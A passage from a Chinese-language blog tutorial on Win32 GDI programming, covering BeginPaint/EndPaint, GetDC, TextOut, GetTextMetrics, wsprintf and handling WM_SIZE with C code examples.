<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">hwnd = CreateWindow(classType1,</span><br><span class="line">    TEXT(<span class="string">&quot;first class first instance&quot;</span>),</span><br><span class="line">    WS_OVERLAPPEDWINDOW,</span><br><span class="line">    CW_USEDEFAULT,</span><br><span class="line">    CW_USEDEFAULT,</span><br><span class="line">    CW_USEDEFAULT,</span><br><span class="line">    CW_USEDEFAULT,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    hInstance,</span><br><span class="line">    <span class="literal">NULL</span>);</span><br><span class="line">ShowWindow(hwnd, iCmdShow);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>窗口实例的句柄</p>
</blockquote>
<p>第二个参数均为LPPAINTSTRUCT类型</p>
<blockquote>
<p>struct PAINTSTRUCT</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagPAINTSTRUCT</span> &#123;</span></span><br><span class="line">  HDC hdc;		<span class="comment">//设备环境句柄</span></span><br><span class="line">  WINBOOL fErase;			<span class="comment">//表明背景是否应该被擦除,0为是</span></span><br><span class="line">  RECT rcPaint;		<span class="comment">//指明需要绘制的矩形区域</span></span><br><span class="line">  WINBOOL fRestore;		<span class="comment">//尚未使用,保留</span></span><br><span class="line">  WINBOOL fIncUpdate;		<span class="comment">//尚未使用</span></span><br><span class="line">  BYTE rgbReserved[<span class="number">32</span>];	<span class="comment">//尚未使用</span></span><br><span class="line">&#125; PAINTSTRUCT,*PPAINTSTRUCT,*NPPAINTSTRUCT,*LPPAINTSTRUCT;</span><br></pre></td></tr></table></figure>
<p>第一个成员就是hdc,这和BeginPaint返回的hdc是同一个值,实际上相当于BeginPaint以通过引用返回了一个包含ps的结构体,然后又单独通过返回值返回了hdc句柄.多此一举,只是为了用起来方便</p>
<p>第二个成员表明Windows在返回该结构体的BeginPaint中,是否擦除了无效区域背景,如果擦除了则fErase=0.默认情况下是会自动擦除的.自定以擦除过程可以处理WM_ERASEBKGND消息</p>
<p>注册窗口类WNDCLASS时指定了一个画刷<code>wndclass.hbrBackground=(HBRUSH)GetStockObject(WHITE_BRUSH)</code>,windows将会使用这里指定的画刷擦除无效背景</p>
<p>第三个参数rcPaint定义了无效矩形边界,以像素为单位,相对于客户区左上角的距离</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220807094042735.png"
alt="image-20220807094042735" />
<figcaption aria-hidden="true">image-20220807094042735</figcaption>
</figure>
<p>该矩形区域就是需要重绘的区域,也就是调用BeginPaint之后重绘的区域</p>
</blockquote>
<p><code>BeginPaint</code>如果调用成功则返回HDC句</p>
<p><code>EndPaint</code>释放一个HDC句柄,调用成功则返回TRUE</p>
<p>绘图GDI函数的调用要夹在两个函数之间</p>
<p>如果只写这两个函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  	PAINTSTRUCT ps;        </span><br><span class="line">hdc = BeginPaint(hwnd, &amp;ps);<span class="comment">//获取设备环境hdc,并且第二个参数ps中也有相同的hdc</span></span><br><span class="line">      EndPaint(hwnd, &amp;ps);<span class="comment">//释放ps中保存的hdc(也就是BeginPaint创建的hdc)</span></span><br></pre></td></tr></table></figure>
<p><code>BeginPaint</code>只会重绘无效矩形部分,也就是第二个参数ps中rcPaint指定的矩形</p>
<p>考虑到客户区有可能是一个圆形或者其他非矩形形状,<strong>一般不管三七二十一将整个客户区重绘一遍</strong>.</p>
<p>这就需要先调用<code>InvalidateRect</code>使得<strong>整个客户区</strong>失效,然后再调用<code>BeingPaint</code>重绘</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">InvalidateRect</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HWND       hWnd,</span></span><br><span class="line"><span class="params">  [in] <span class="type">const</span> RECT *lpRect,</span></span><br><span class="line"><span class="params">  [in] BOOL       bErase</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<p>第一个参数是窗口句柄</p>
<p>第二个参数是需要无效化的矩形范围,如果是NULL则表示整个客户区</p>
<p>第三个参数决定BeginPaint是否擦除原背景,当bErase=TRUE则擦除原有背景.否则不擦除</p>
</blockquote>
<h4 id="getdcreleasedc">GetDC/ReleaseDC</h4>
<p>处理非WM_PAINT消息时,如果需要绘制客户区,就要调用这一对.</p>
<p>或者只是需要设备环境信息,不需要绘图时,可以调用这一对.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HDC GetDC(</span><br><span class="line">  [in] HWND hWnd		//窗口实例句柄</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">int ReleaseDC(</span><br><span class="line">  [in] HWND hWnd,		</span><br><span class="line">  [in] HDC  hDC		//需要释放的hDC句柄,一定是最近的GetDC获取的那个句柄,两个函数配套使用</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>两个函数的使用一定是在处理同一条消息时配对完成的</p>
<p>GetDC返回的设备句柄可以在整个客户区绘制,但是BeginPaint只允许在失效矩形绘制</p>
<p>GetDC不会将无效矩形有效化.如有需要,显式调用<code>ValidateRect(hwnd,rect)</code>,当rect为NULL则表示整个客户区</p>
<h4 id="getwindowdcreleasewindowdc">GetWindowDC/ReleaseWindowDC</h4>
<p>GetDC绘制的只有客户区,对于窗口标题栏这种非客户区无能为力</p>
<p>GetWindowDC则可以绘制包括客户区,非客户区在内该窗口的所有区域</p>
<p>相应的消息是WM_NCPAINT</p>
<h3 id="gdi绘制函数">GDI绘制函数</h3>
<h4 id="textout">TEXTOUT</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">TextOutA</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HDC    hdc,<span class="comment">//GetDC或者BeginPaint返回的hdc句柄</span></span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>    x,<span class="comment">//输出在客户区的起始水平位置</span></span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>    y,</span></span><br><span class="line"><span class="params">  [in] LPCSTR lpString,<span class="comment">//需要输出的字符串</span></span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>    c<span class="comment">//输出字符串长度</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>关于x,y坐标</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220807101513222.png"
alt="image-20220807101513222" />
<figcaption aria-hidden="true">image-20220807101513222</figcaption>
</figure>
</blockquote>
<h5 id="gettextmatrics获取字体尺寸">GetTextMatrics获取字体尺寸</h5>
<p>系统字体取决于分辨率和字号大小,不能假设字体大小,而是调用函数获取信息,编写设备无关代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagTEXTMETRICA</span> &#123;</span></span><br><span class="line">    LONG tmHeight;<span class="comment">//字体总高度</span></span><br><span class="line">    LONG tmAscent;<span class="comment">//字体基线以上高度</span></span><br><span class="line">    LONG tmDescent;<span class="comment">//字体基线以下高度</span></span><br><span class="line">    LONG tmInternalLeading;<span class="comment">//字体重音符号高度</span></span><br><span class="line">    LONG tmExternalLeading;<span class="comment">//行间距</span></span><br><span class="line">    LONG tmAveCharWidth;<span class="comment">//消息字符加权宽度</span></span><br><span class="line">    LONG tmMaxCharWidth;<span class="comment">//最宽字符宽度</span></span><br><span class="line">    LONG tmWeight;<span class="comment">//字体粗细</span></span><br><span class="line">    LONG tmOverhang;<span class="comment">//为字符串加粗或者斜体额外宽度</span></span><br><span class="line">    LONG tmDigitizedAspectX;</span><br><span class="line">    LONG tmDigitizedAspectY;</span><br><span class="line">    BYTE tmFirstChar;该字体第一个字符的编号</span><br><span class="line">    BYTE tmLastChar;</span><br><span class="line">    BYTE tmDefaultChar;</span><br><span class="line">    BYTE tmBreakChar;</span><br><span class="line">    BYTE tmItalic;</span><br><span class="line">    BYTE tmUnderlined;</span><br><span class="line">    BYTE tmStruckOut;</span><br><span class="line">    BYTE tmPitchAndFamily;<span class="comment">//决定字体是否是等宽字体,最低位为1则变宽,为0则等宽</span></span><br><span class="line">    BYTE tmCharSet;</span><br><span class="line">  &#125; TEXTMETRICA,*PTEXTMETRICA,*NPTEXTMETRICA,*LPTEXTMETRICA;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">GetTextMetricsW</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]  HDC           hdc,</span></span><br><span class="line"><span class="params">  [out] LPTEXTMETRICW lptm</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<p><code>GetTextMetricsW</code>第一个参数是一个hdc设备环境句柄,该函数就是返回该hdc设备环境中的字体属性</p>
<p>第二个参数是一个<code>TEXTMETRICA</code>类型的引用,用来承载返回值</p>
<blockquote>
<p>该结构体类型有20个成员,成员意义:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220807102446433.png"
alt="image-20220807102446433" />
<figcaption aria-hidden="true">image-20220807102446433</figcaption>
</figure>
</blockquote>
<h5 id="文本格式化">文本格式化</h5>
<p><code>GetTextMetrics</code>应该什么时候调用呢?</p>
<p>windows运行时,系统字体不会改变,因此<code>GetTextMetircs</code>只需要调用一次,保存下字体属性,一劳永逸</p>
<p>那么啥时候办这个"一劳"呢?在处理<code>WM_CREATE</code>消息时.</p>
<p>为啥在这个时候?<code>WM_CREATE</code>一定是窗口收到的第一条消息,此时窗口还没有输出到桌面,文字都还没打印.机不可失</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">hwnd = CreateWindow(classType1,</span><br><span class="line">        TEXT(<span class="string">&quot;first class first instance&quot;</span>),</span><br><span class="line">        WS_OVERLAPPEDWINDOW,</span><br><span class="line">        CW_USEDEFAULT,</span><br><span class="line">        CW_USEDEFAULT,</span><br><span class="line">        CW_USEDEFAULT,</span><br><span class="line">        CW_USEDEFAULT,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        hInstance,</span><br><span class="line">        <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
<p>在创建窗口实例时就会发送WM_CREATE消息</p>
</blockquote>
<p>举个例子,假如要打印多行字符,需要设置好字间距和行间距</p>
<p>字间距好说,就是<code>tmAveCharWidth</code></p>
<p>行间距(这里的行间距指的是上一行字体的顶和下一行字体的顶的距离,包括纯空白的高度)麻烦点,需要<code>tmHeight+tmExternalLeading</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">LRESULT CALLBACK <span class="title function_">WndProc</span><span class="params">(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    HDC hdc;<span class="comment">//设备环境句柄</span></span><br><span class="line">    PAINTSTRUCT ps;</span><br><span class="line">    RECT rect;</span><br><span class="line">    TEXTMETRICA tm;<span class="comment">//字体属性结构</span></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> cxChar,cyChar;</span><br><span class="line">    <span class="type">static</span> TCHAR szBuffer[<span class="number">128</span>] = TEXT(<span class="string">&quot;default&quot;</span>);</span><br><span class="line">    <span class="keyword">switch</span> (message)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> WM_CREATE:</span><br><span class="line">        </span><br><span class="line">        hdc=GetDC(hwnd);</span><br><span class="line">        GetTextMetrics(hdc,&amp;tm);<span class="comment">//获取当前系统字体属性,用tm承载</span></span><br><span class="line">        cxChar=tm.tmAveCharWidth;<span class="comment">//cxChar为平均小写字母宽度</span></span><br><span class="line">        cyChar=tm.tmHeight+tm.tmExternalLeading;<span class="comment">//cyChar为字体高度加上一个行间距</span></span><br><span class="line">        ReleaseDC(hwnd,hdc);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">case</span> ...</span><br><span class="line">    <span class="keyword">return</span> DefWindowProc(hwnd, message, wParam, lParam);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="wsprintf格式化字符串">wsprintf格式化字符串</h5>
<p>不管是<code>TextOut</code>还是<code>DrawText</code>,决定往屏幕输出的参数都是字符串类型,不能是结构体或者整数或者浮点数</p>
<p>想要类似使用<code>cout&lt;&lt;5</code>这种直接打印整数到窗口是不可能的</p>
<p>那么怎么打印整数呢?用wsprintf先把要打印的所有东西,格式化到一个字符中,然后输出这个字符串</p>
<p>比如统计鼠标左键在客户区按下的次数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_LBUTTONDOWN:</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> cLBUTTONDOWN;<span class="comment">//铁打的静态变量只会定义一次</span></span><br><span class="line">    ++cLBUTTONDOWN;</span><br><span class="line">    TCHAR szBuffer[<span class="number">100</span>];<span class="comment">//流水的局部变量</span></span><br><span class="line">    wsprintf(szBuffer,TEXT(<span class="string">&quot;this is the %d time you click the left button&quot;</span>),cLBUTTONDOWN);<span class="comment">//格式化字符串到szBuffer</span></span><br><span class="line">    hdc = GetDC(hwnd);</span><br><span class="line">    GetClientRect(hwnd, &amp;rect);</span><br><span class="line">    DrawText(hdc, szBuffer, <span class="number">-1</span>, &amp;rect, DT_SINGLELINE | DT_CENTER | DT_VCENTER);</span><br><span class="line">    ReleaseDC(hwnd, hdc);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220807110305547.png"
alt="image-20220807110305547" />
<figcaption aria-hidden="true">image-20220807110305547</figcaption>
</figure>
<p>每次按下鼠标左键都会更新cLBUTTONDOWN这个统计数字</p>
<h5 id="显式多行">显式多行</h5>
<p>windows32编程上给出的例子是<strong>打印SystemMetrics所有的系统参数</strong></p>
<p>效果如图</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220807145300545.png"
alt="image-20220807145300545" />
<figcaption aria-hidden="true">image-20220807145300545</figcaption>
</figure>
<p>已经有一个窗口程序的雏形了</p>
<p>使用GetSystemMetrics获取系统参数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">GetSystemMetrics</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span> nIndex</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<p>该函数使用一个下标作为参数,意思是查询SystemMetrics表的第nIndex个元素</p>
<blockquote>
<p>这个表啥样呢?</p>
<table>
<colgroup>
<col style="width: 23%" />
<col style="width: 76%" />
</colgroup>
<thead>
<tr>
<th style="text-align: left;">Value</th>
<th style="text-align: left;">Meaning</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left;"><strong>SM_ARRANGE</strong>56</td>
<td style="text-align: left;">The flags that specify how the system
arranged minimized windows. For more information, see the Remarks
section in this topic.</td>
</tr>
<tr>
<td style="text-align: left;"><strong>SM_CLEANBOOT</strong>67</td>
<td style="text-align: left;">The value that specifies how the system is
started:0 Normal boot1 Fail-safe boot2 Fail-safe with network bootA
fail-safe boot (also called SafeBoot, Safe Mode, or Clean Boot) bypasses
the user startup files.</td>
</tr>
<tr>
<td style="text-align: left;"><strong>SM_CMONITORS</strong>80</td>
<td style="text-align: left;">The number of display monitors on a
desktop. For more information, see the Remarks section in this
topic.</td>
</tr>
<tr>
<td style="text-align: left;">....</td>
<td style="text-align: left;">...</td>
</tr>
</tbody>
</table>
<p>Value为枚举类型的下标,从0开始编号,微软给出的文档并没有按照Value递增的顺序,而是按照枚举值字符串的字典序递增排列的<code>SM_ARRANGE&lt;SM_CLEANBOOT</code></p>
</blockquote>
<p>为了<strong>方便观察</strong>,书上先建立了一个头文件sysmets.h,里面只有一个结构体数组<code>struct sysmetrics[]</code>,每个结构体数组有三项,下标,枚举值字符串,意义.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">int</span> Index;</span><br><span class="line">	<span class="type">const</span> TCHAR* szLabel;<span class="comment">//此处需要用const修饰字符串常量,否则在virsual studio上会报告指针指向常量的错误</span></span><br><span class="line">	<span class="type">const</span> TCHAR* szDesc;</span><br><span class="line">&#125;sysmetrics[] =</span><br><span class="line">&#123;</span><br><span class="line"> 	SM_CXSCREEN, <span class="comment">//初始化本结构体数组第一个元素的第一个成员</span></span><br><span class="line">    TEXT(<span class="string">&quot;SM_CXSCREEN&quot;</span>),<span class="comment">//sysmetrics[0].szLabel=TEXT(&quot;SM_CXSCREEN&quot;);</span></span><br><span class="line"> 	TEXT(<span class="string">&quot;Screen width in pixels&quot;</span>),<span class="comment">//初始化本结构体数组第一个元素的第三个成员szDesc</span></span><br><span class="line">    </span><br><span class="line">SM_CYSCREEN, TEXT(<span class="string">&quot;SM_CYSCREEN&quot;</span>),</span><br><span class="line"> TEXT(<span class="string">&quot;Screen height in pixels&quot;</span>),</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>GetSystemMetrics(Index)</code>将会和<code>systemtrics[Index]</code>配套使用</p>
<p>然后主程序包含该头文件,相当于直接在主程序中定义了这么一个结构体数组</p>
<p>这个数组还有<code>GetSystemMetrics</code>函数在啥时候发挥的作用呢?</p>
<p>在WndProc消息处理函数中,下面炎鸠以下这个回调函数干了啥</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">LRESULT CALLBACK <span class="title function_">WndProc</span><span class="params">(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> cxChar, cxCaps, cyChar;<span class="comment">//静态的小写,大写字体宽度,行间距</span></span><br><span class="line">	HDC hdc;<span class="comment">//设备环境句柄</span></span><br><span class="line">	<span class="type">int</span> i;<span class="comment">//遍历sysmetrics数组时使用的循环变量i</span></span><br><span class="line">	PAINTSTRUCT ps;<span class="comment">//</span></span><br><span class="line">	TCHAR szBuffer[<span class="number">10</span>];<span class="comment">//缓冲区,用于整合一行需要打印的字符</span></span><br><span class="line">	TEXTMETRIC tm;<span class="comment">//字体属性结构体,用于承载GetTextMetrics返回值</span></span><br><span class="line">	<span class="keyword">switch</span> (message)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> WM_CREATE:</span><br><span class="line">		hdc = GetDC(hwnd);</span><br><span class="line">		GetTextMetrics(hdc, &amp;tm);<span class="comment">//tm获取当前字体属性</span></span><br><span class="line">		cxChar = tm.tmAveCharWidth;<span class="comment">//获取小写字体宽度</span></span><br><span class="line">		cxCaps = (tm.tmPitchAndFamily &amp; <span class="number">1</span> ? <span class="number">3</span> : <span class="number">2</span>) * cxChar / <span class="number">2</span>;</span><br><span class="line">            <span class="comment">//获取大写字体宽度,变宽字体中,该值应该为小写字体宽度的1.5倍,等宽字体中大小写字母的宽度应该一样</span></span><br><span class="line">            <span class="comment">//由于的最低为是等宽变宽标志,因此与1按位与之后的结果,</span></span><br><span class="line">            <span class="comment">//如果为1说明字体变宽,cxCaps先等于三倍的cxChar然后除以2就是1.5倍的小写字母宽度</span></span><br><span class="line">		cyChar = tm.tmHeight + tm.tmExternalLeading;<span class="comment">//行间距,上一行字的本行字顶的距离</span></span><br><span class="line">		ReleaseDC(hwnd, hdc);<span class="comment">//释放设备环境</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">case</span> WM_PAINT:</span><br><span class="line">		hdc = BeginPaint(hwnd, &amp;ps);<span class="comment">//重绘无效区,获得设备环境句柄</span></span><br><span class="line">		<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NUMLINES; i++)<span class="comment">//SystemMetrics有NUMLINES项,因此下标遍历0到NUMLINES</span></span><br><span class="line">		&#123;</span><br><span class="line">            <span class="comment">//每行打印三项,枚举类型字符串,意义,参数值</span></span><br><span class="line">			TextOut(hdc, <span class="number">0</span>, cyChar * i,<span class="comment">//第二个参数中cyChar就起了作用,规定在哪里开始绘制,因为前面i行都已经绘制完毕,因此本行应该在第i+1行位置绘制</span></span><br><span class="line">				sysmetrics[i].szLabel,</span><br><span class="line">				lstrlen(sysmetrics[i].szLabel));</span><br><span class="line">			TextOut(hdc, <span class="number">22</span> * cxCaps, cyChar * i,<span class="comment">//x坐标也有意义了,因为szLabel已经占用了从x=0开始的一些字节,因此szDesc从x=22开始绘制</span></span><br><span class="line">				sysmetrics[i].szDesc,</span><br><span class="line">				lstrlen(sysmetrics[i].szDesc));</span><br><span class="line">			SetTextAlign(hdc, TA_RIGHT | TA_TOP);<span class="comment">//设置文本右上角对齐,作用于hdc指向的设备环境</span></span><br><span class="line">			TextOut(hdc, <span class="number">22</span> * cxCaps + <span class="number">40</span> * cxChar, cyChar * i, szBuffer,</span><br><span class="line">				wsprintf(szBuffer, TEXT(<span class="string">&quot;%5d&quot;</span>),</span><br><span class="line">                       </span><br><span class="line">					GetSystemMetrics(sysmetrics[i].Index)));<span class="comment">//此处压行了,szBuffer的构造放在了最后一个参数的求值中</span></span><br><span class="line">			SetTextAlign(hdc, TA_LEFT | TA_TOP);<span class="comment">//设置回左对齐,好借好还,再借不难</span></span><br><span class="line">		&#125;</span><br><span class="line">		EndPaint(hwnd, &amp;ps);<span class="comment">//结束绘制,释放ps中的hdc设备环境</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">		PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> DefWindowProc(hwnd, message, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="打印不开问题">打印不开问题</h4>
<p><del>由于心胸狭隘</del></p>
<p>如果电脑屏幕比较小,那么可以显式的行数就少,可能一个屏幕没法全部打印出来.甚至屏幕窄了一行都显式不全,比如:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220807161039836.png"
alt="image-20220807161039836" />
<figcaption aria-hidden="true">image-20220807161039836</figcaption>
</figure>
<p>这是因为本程序没有考虑客户区的大小,它只管打印它的,不管人能不能看见</p>
<p>怎么获取客户区的大小呢?</p>
<h5 id="getclientrect">GetClientRect</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">GetClientRect</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]  HWND   hWnd,</span></span><br><span class="line"><span class="params">  [out] LPRECT lpRect</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<p>第一个参数是设备环境句柄</p>
<p>第二个参数是返回值,用一个RECT结构体引用承载当前客户区信息</p>
<p>这个结构体啥样呢?</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagRECT</span> &#123;</span></span><br><span class="line">  LONG left;</span><br><span class="line">  LONG top;</span><br><span class="line">  LONG right;</span><br><span class="line">  LONG bottom;</span><br><span class="line">&#125; RECT, *PRECT, *NPRECT, *LPRECT;</span><br></pre></td></tr></table></figure>
<p>GetClientRect返回的矩形中,左和上坐标都是0,即以客户区的左上角为基准</p>
<p><strong>右和下坐标是实际大小</strong>(像素)</p>
<h5 id="处理wm_size消息">处理WM_SIZE消息</h5>
<p>更好的方法是处理WM_SIZE消息</p>
<p>每当窗口大小发生变化(位置变化不算),Windows就会向窗口过程发送一条WM_SIZE消息,此时传递给WndProc处理函数的lParam参数就有实际意义了,高16位是新的窗口高度,低16位是新的窗口宽度,可以使用两个静态变量来承载保存这个两个值,静态的好处是只会定义一次,那么在本次处理WM_SIZE消息时修改这两个值,就可以在处理下一条消息比如WM_PAINT时使用刚才保存的值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">WndProc(...):</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> cxClient, cyClient;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">switch</span> (message) &#123;</span><br><span class="line"><span class="keyword">case</span> ...</span><br><span class="line"><span class="keyword">case</span> WM_SIZE:</span><br><span class="line">	cxClient = LOWORD(lParam);</span><br><span class="line">	cyClient = HIWORD(lParam);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span 